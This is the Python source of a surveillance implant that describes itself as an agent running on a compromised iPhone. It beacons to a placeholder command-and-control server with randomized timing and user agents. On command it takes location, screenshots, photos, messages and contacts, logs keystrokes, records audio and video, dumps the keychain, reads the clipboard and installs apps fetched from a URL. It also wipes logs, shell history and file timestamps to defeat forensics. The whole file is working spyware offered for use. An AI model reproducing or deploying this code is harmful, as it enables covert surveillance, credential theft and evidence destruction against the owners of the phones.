#!/usr/bin/env python3
"""
iPhone Device Agent - Runs on compromised device
Handles command execution, data collection, and C2 communication
"""

import asyncio
import base64
import hashlib
import json
import logging
import os
import platform
import random
import sqlite3
import subprocess
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional
import aiohttp
from cryptography.fernet import Fernet

# Configure logging (stealth mode - minimal logs)
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

# Stealth configuration
MIN_HEARTBEAT_INTERVAL = 300  # 5 minutes
MAX_HEARTBEAT_INTERVAL = 900  # 15 minutes
LOW_BATTERY_THRESHOLD = 20  # Percentage
STEALTH_PROCESS_NAMES = [
    'com.apple.system',
    'com.apple.backgroundprocessing',
    'com.apple.systemupdateservice',
    'com.apple.analyticsd',
]


class DeviceAgent:
    """Agent running on compromised iPhone"""
    
    def __init__(self, c2_server: str, device_id: str, encryption_key: bytes):
        self.c2_server = c2_server
        self.device_id = device_id
        self.fernet = Fernet(encryption_key)
        self.running = False
        self.battery_level = 100
        self.last_heartbeat = time.time()
        self.stealth_mode = True
        self.user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15',
        ]
        self.command_handlers = {
            'get_location': self.get_location,
            'capture_screen': self.capture_screen,
            'collect_photos': self.collect_photos,
            'collect_messages': self.collect_messages,
            'start_keylog': self.start_keylog,
            'install_app': self.install_app,
            'clear_logs': self.clear_logs,
            'remove_artifacts': self.remove_artifacts,
            'reset_timestamps': self.reset_timestamps,
            'clear_cache': self.clear_cache,
            'exfiltrate_contacts': self.exfiltrate_contacts,
            'record_audio': self.record_audio,
            'record_video': self.record_video,
            'steal_credentials': self.steal_credentials,
            'monitor_clipboard': self.monitor_clipboard,
            'track_apps': self.track_apps
        }
        
    def get_random_user_agent(self) -> str:
        """Get random user agent for stealth"""
        return random.choice(self.user_agents)
    
    def get_heartbeat_interval(self) -> int:
        """Get randomized heartbeat interval with battery awareness"""
        base_interval = random.randint(MIN_HEARTBEAT_INTERVAL, MAX_HEARTBEAT_INTERVAL)
        
        # If battery is low, extend intervals to reduce detection
        if self.battery_level < LOW_BATTERY_THRESHOLD:
            base_interval *= 2
        
        return base_interval
    
    async def check_battery_level(self) -> int:
        """Get current battery level"""
        try:
            # Try to get battery level
            result = subprocess.run(
                ['ioreg', '-n', 'AppleSmartBattery', '-r'],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'MaxCapacity' in line and 'CurrentCapacity' in line:
                        # Extract battery percentage if available
                        pass
        except Exception:
            pass
        
        return 100  # Default to 100 if we can't determine
    
    async def is_dormant_time(self) -> bool:
        """Check if we should be dormant (late night hours)"""
        current_hour = datetime.now().hour
        # Sleep during 2-6 AM to avoid suspicious activity
        return 2 <= current_hour <= 6
    
    async def register(self) -> bool:
        """Register device with C2 server with stealth features"""
        try:
            # Check battery and adjust behavior
            self.battery_level = await self.check_battery_level()
            
            # Check if dormant time
            if await self.is_dormant_time():
                # Extended delay during dormant hours
                await asyncio.sleep(random.randint(60, 300))
            
            device_info = await self.collect_device_info()
            encrypted_info = self.fernet.encrypt(json.dumps(device_info).encode())
            
            # Randomize user agent
            user_agent = self.get_random_user_agent()
            
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.c2_server}/api/register",
                    json={
                        'device_id': self.device_id,
                        'info': base64.b64encode(encrypted_info).decode(),
                        'timestamp': time.time()
                    },
                    headers={'User-Agent': user_agent}
                ) as resp:
                    if resp.status == 200:
                        return True
                        
        except Exception as e:
            pass
            
        return False
        
    async def collect_device_info(self) -> Dict:
        """Collect comprehensive device information"""
        info = {
            'device_id': self.device_id,
            'platform': platform.system(),
            'version': platform.version(),
            'architecture': platform.machine(),
            'hostname': platform.node(),
            'timestamp': time.time()
        }
        
        # iOS-specific info (if running on iOS)
        try:
            # Get iOS version
            result = subprocess.run(
                ['sw_vers', '-productVersion'],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                info['ios_version'] = result.stdout.strip()
                
            # Get device model
            result = subprocess.run(
                ['sysctl', '-n', 'hw.model'],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                info['model'] = result.stdout.strip()
                
            # Get UDID
            result = subprocess.run(
                ['system_profiler', 'SPHardwareDataType'],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'UUID' in line:
                        info['udid'] = line.split(':')[1].strip()
                        
        except Exception as e:
            print(f"[!] Device info collection error: {e}")
            
        return info
        
    async def heartbeat_loop(self):
        """Maintain connection with C2 server with stealth features"""
        while self.running:
            try:
                # Check if dormant time
                if await self.is_dormant_time():
                    # Sleep longer during dormant hours
                    await asyncio.sleep(1800)  # 30 minutes
                    continue
                
                # Update battery level
                self.battery_level = await self.check_battery_level()
                
                # Get randomized heartbeat interval
                interval = self.get_heartbeat_interval()
                
                # Randomize user agent
                user_agent = self.get_random_user_agent()
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        f"{self.c2_server}/api/heartbeat",
                        params={'device_id': self.device_id},
                        headers={'User-Agent': user_agent},
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            
                            # Process pending commands
                            if data.get('pending_commands'):
                                for cmd in data['pending_commands']:
                                    try:
                                        await self.execute_command(cmd)
                                    except Exception:
                                        pass
                                    
            except asyncio.TimeoutError:
                # Timeout is expected, just wait and retry
                pass
            except Exception:
                # Silent failures for stealth
                pass
                
            # Randomized interval with jitter
            await asyncio.sleep(interval + random.randint(-30, 30))
            
    async def execute_command(self, command: Dict) -> Dict:
        """Execute command from C2"""
        try:
            cmd_type = command['command']
            args = command.get('args', {})
            
            if cmd_type in self.command_handlers:
                handler = self.command_handlers[cmd_type]
                result = await handler(**args)
                
                return {
                    'status': 'success',
                    'result': result
                }
            else:
                return {
                    'status': 'error',
                    'message': f'Unknown command: {cmd_type}'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
            
    async def get_location(self) -> Dict:
        """Get device GPS location"""
        try:
            # Use Core Location framework (requires proper entitlements)
            result = subprocess.run(
                ['whereami', '-f', 'json'],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                location = json.loads(result.stdout)
                return {
                    'latitude': location.get('latitude'),
                    'longitude': location.get('longitude'),
                    'accuracy': location.get('accuracy'),
                    'timestamp': time.time()
                }
                
        except Exception as e:
            print(f"[!] Location error: {e}")
            
        return {}
        
    async def capture_screen(self) -> Dict:
        """Capture device screenshot"""
        try:
            screenshot_path = f"/tmp/screenshot_{int(time.time())}.png"
            
            # Use screencapture on macOS/iOS
            result = subprocess.run(
                ['screencapture', '-x', screenshot_path],
                timeout=10
            )
            
            if result.returncode == 0 and Path(screenshot_path).exists():
                # Read and encode screenshot
                screenshot_data = Path(screenshot_path).read_bytes()
                encoded = base64.b64encode(screenshot_data).decode()
                
                # Clean up
                Path(screenshot_path).unlink()
                
                return {
                    'screenshot': encoded,
                    'size': len(screenshot_data),
                    'timestamp': time.time()
                }
                
        except Exception as e:
            print(f"[!] Screenshot error: {e}")
            
        return {}
        
    async def collect_photos(self) -> Dict:
        """Collect photos from device"""
        try:
            photos_dir = Path.home() / "Pictures"
            collected = []
            
            for photo in photos_dir.rglob("*.jpg"):
                if photo.stat().st_size < 10 * 1024 * 1024:  # Max 10MB
                    collected.append({
                        'path': str(photo),
                        'size': photo.stat().st_size,
                        'modified': photo.stat().st_mtime
                    })
                    
            # Package photos for exfiltration
            archive_path = f"/tmp/photos_{int(time.time())}.tar.gz"
            subprocess.run(
                ['tar', '-czf', archive_path] + [p['path'] for p in collected[:100]],
                timeout=300
            )
            
            if Path(archive_path).exists():
                archive_data = Path(archive_path).read_bytes()
                encoded = base64.b64encode(archive_data).decode()
                Path(archive_path).unlink()
                
                return {
                    'data': encoded,
                    'count': len(collected),
                    'size': len(archive_data)
                }
                
        except Exception as e:
            print(f"[!] Photo collection error: {e}")
            
        return {}
        
    async def collect_messages(self) -> Dict:
        """Collect messages from device"""
        try:
            # Access Messages database
            messages_db = Path.home() / "Library/Messages/chat.db"
            
            if not messages_db.exists():
                return {'error': 'Messages database not found'}
                
            conn = sqlite3.connect(str(messages_db))
            cursor = conn.cursor()
            
            # Extract messages
            cursor.execute("""
                SELECT 
                    message.ROWID,
                    message.text,
                    message.date,
                    handle.id as sender
                FROM message
                LEFT JOIN handle ON message.handle_id = handle.ROWID
                ORDER BY message.date DESC
                LIMIT 1000
            """)
            
            messages = []
            for row in cursor.fetchall():
                messages.append({
                    'id': row[0],
                    'text': row[1],
                    'date': row[2],
                    'sender': row[3]
                })
                
            conn.close()
            
            # Encode messages
            encoded = base64.b64encode(json.dumps(messages).encode()).decode()
            
            return {
                'data': encoded,
                'count': len(messages)
            }
            
        except Exception as e:
            print(f"[!] Message collection error: {e}")
            
        return {}
        
    async def start_keylog(self, duration: int = 3600) -> Dict:
        """Start keylogging for specified duration"""
        try:
            # Install keylogger (requires root/jailbreak)
            keylog_script = """#!/bin/bash
LOG_FILE="/tmp/keylog_$(date +%s).txt"
while true; do
    # Capture keyboard events
    log stream --predicate 'eventMessage contains "key"' >> $LOG_FILE
    sleep 1
done
"""
            
            script_path = Path("/tmp/keylogger.sh")
            script_path.write_text(keylog_script)
            script_path.chmod(0o755)
            
            # Start keylogger in background
            subprocess.Popen(
                ['/bin/bash', str(script_path)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            return {
                'status': 'started',
                'duration': duration,
                'log_file': f"/tmp/keylog_{int(time.time())}.txt"
            }
            
        except Exception as e:
            print(f"[!] Keylogger error: {e}")
            
        return {}
        
    async def install_app(self, ipa_url: str) -> Dict:
        """Install app from URL"""
        try:
            # Download IPA
            ipa_path = f"/tmp/app_{int(time.time())}.ipa"
            
            async with aiohttp.ClientSession() as session:
                async with session.get(ipa_url) as resp:
                    if resp.status == 200:
                        Path(ipa_path).write_bytes(await resp.read())
                        
            # Install IPA
            result = subprocess.run(
                ['ideviceinstaller', '-i', ipa_path],
                capture_output=True, text=True, timeout=120
            )
            
            # Clean up
            Path(ipa_path).unlink()
            
            return {
                'status': 'installed' if result.returncode == 0 else 'failed',
                'output': result.stdout
            }
            
        except Exception as e:
            print(f"[!] App installation error: {e}")
            
        return {}
        
    async def clear_logs(self) -> Dict:
        """Clear system logs"""
        try:
            # Clear system logs
            subprocess.run(['log', 'erase', '--all'], timeout=30)
            
            # Clear crash reports
            crash_dir = Path.home() / "Library/Logs/DiagnosticReports"
            if crash_dir.exists():
                for log in crash_dir.glob("*"):
                    log.unlink()
                    
            return {'status': 'cleared'}
            
        except Exception as e:
            print(f"[!] Log clearing error: {e}")
            
        return {}
        
    async def remove_artifacts(self) -> Dict:
        """Remove forensic artifacts"""
        try:
            artifacts = [
                "/tmp/*",
                "~/Library/Caches/*",
                "~/.bash_history",
                "~/.zsh_history"
            ]
            
            for pattern in artifacts:
                subprocess.run(
                    ['rm', '-rf', os.path.expanduser(pattern)],
                    timeout=30
                )
                
            return {'status': 'cleaned'}
            
        except Exception as e:
            print(f"[!] Artifact removal error: {e}")
            
        return {}
        
    async def reset_timestamps(self) -> Dict:
        """Reset file timestamps to avoid detection"""
        try:
            # Reset timestamps on modified files
            suspicious_files = [
                "/tmp",
                str(Path.home() / "Library/Caches")
            ]
            
            for path in suspicious_files:
                subprocess.run(
                    ['touch', '-t', '202001010000', path],
                    timeout=10
                )
                
            return {'status': 'reset'}
            
        except Exception as e:
            print(f"[!] Timestamp reset error: {e}")
            
        return {}
        
    async def clear_cache(self) -> Dict:
        """Clear application caches"""
        try:
            cache_dir = Path.home() / "Library/Caches"
            
            if cache_dir.exists():
                for cache in cache_dir.glob("*"):
                    if cache.is_dir():
                        subprocess.run(['rm', '-rf', str(cache)], timeout=30)
                        
            return {'status': 'cleared'}
            
        except Exception as e:
            print(f"[!] Cache clearing error: {e}")
            
        return {}
        
    async def exfiltrate_contacts(self) -> Dict:
        """Exfiltrate contacts database"""
        try:
            contacts_db = Path.home() / "Library/Application Support/AddressBook/AddressBook.sqlitedb"
            
            if contacts_db.exists():
                data = contacts_db.read_bytes()
                encoded = base64.b64encode(data).decode()
                
                return {
                    'data': encoded,
                    'size': len(data)
                }
                
        except Exception as e:
            print(f"[!] Contacts exfiltration error: {e}")
            
        return {}
        
    async def record_audio(self, duration: int = 60) -> Dict:
        """Record audio from microphone"""
        try:
            audio_file = f"/tmp/audio_{int(time.time())}.m4a"
            
            # Record audio using sox or ffmpeg
            subprocess.run(
                ['ffmpeg', '-f', 'avfoundation', '-i', ':0', '-t', str(duration), audio_file],
                timeout=duration + 10
            )
            
            if Path(audio_file).exists():
                data = Path(audio_file).read_bytes()
                encoded = base64.b64encode(data).decode()
                Path(audio_file).unlink()
                
                return {
                    'data': encoded,
                    'duration': duration,
                    'size': len(data)
                }
                
        except Exception as e:
            print(f"[!] Audio recording error: {e}")
            
        return {}
        
    async def record_video(self, duration: int = 30) -> Dict:
        """Record video from camera"""
        try:
            video_file = f"/tmp/video_{int(time.time())}.mp4"
            
            # Record video using ffmpeg
            subprocess.run(
                ['ffmpeg', '-f', 'avfoundation', '-i', '0', '-t', str(duration), video_file],
                timeout=duration + 10
            )
            
            if Path(video_file).exists():
                data = Path(video_file).read_bytes()
                encoded = base64.b64encode(data).decode()
                Path(video_file).unlink()
                
                return {
                    'data': encoded,
                    'duration': duration,
                    'size': len(data)
                }
                
        except Exception as e:
            print(f"[!] Video recording error: {e}")
            
        return {}
        
    async def steal_credentials(self) -> Dict:
        """Steal stored credentials from keychain"""
        try:
            credentials = {}
            
            # Dump keychain (requires root)
            result = subprocess.run(
                ['security', 'dump-keychain'],
                capture_output=True, text=True, timeout=30
            )
            
            if result.returncode == 0:
                credentials['keychain'] = result.stdout
                
            # Encode credentials
            encoded = base64.b64encode(json.dumps(credentials).encode()).decode()
            
            return {
                'data': encoded,
                'count': len(credentials)
            }
            
        except Exception as e:
            print(f"[!] Credential theft error: {e}")
            
        return {}
        
    async def monitor_clipboard(self) -> Dict:
        """Monitor clipboard for sensitive data"""
        try:
            # Get clipboard content
            result = subprocess.run(
                ['pbpaste'],
                capture_output=True, text=True, timeout=5
            )
            
            if result.returncode == 0:
                clipboard = result.stdout
                
                return {
                    'content': clipboard,
                    'timestamp': time.time()
                }
                
        except Exception as e:
            print(f"[!] Clipboard monitoring error: {e}")
            
        return {}
        
    async def track_apps(self) -> Dict:
        """Track installed and running apps"""
        try:
            # List installed apps
            result = subprocess.run(
                ['system_profiler', 'SPApplicationsDataType', '-json'],
                capture_output=True, text=True, timeout=30
            )
            
            if result.returncode == 0:
                apps = json.loads(result.stdout)
                
                return {
                    'apps': apps,
                    'count': len(apps.get('SPApplicationsDataType', []))
                }
                
        except Exception as e:
            print(f"[!] App tracking error: {e}")
            
        return {}
        
    async def cleanup_temp_files(self):
        """Remove all temporary files for stealth"""
        try:
            temp_patterns = [
                '/tmp/*_agent_*',
                '/tmp/*screenshot_*',
                '/tmp/*audio_*',
                '/tmp/*video_*',
                '/tmp/*keylog_*',
            ]
            
            for pattern in temp_patterns:
                try:
                    subprocess.run(['rm', '-rf'] + [pattern], timeout=5, capture_output=True)
                except Exception:
                    pass
        except Exception:
            pass
    
    async def run(self):
        """Start agent with stealth features"""
        self.running = True
        
        # Clean up any old temp files
        await self.cleanup_temp_files()
        
        # Register with C2
        max_retries = 3
        retry_count = 0
        
        while retry_count < max_retries:
            if await self.register():
                break
            retry_count += 1
            await asyncio.sleep(random.randint(30, 60))
        else:
            # Failed to register after retries, stop
            self.running = False
            return
            
        # Start heartbeat loop
        await self.heartbeat_loop()
        
    def stop(self):
        """Stop agent and clean up"""
        self.running = False
        # Clean up temp files
        asyncio.create_task(self.cleanup_temp_files())


async def main():
    """Run device agent"""
    agent = DeviceAgent(
        c2_server="https://your-c2-server.com",
        device_id="00008030-001234567890ABCD",
        encryption_key=b'your-encryption-key-here'
    )
    
    await agent.run()


if __name__ == "__main__":
    asyncio.run(main())
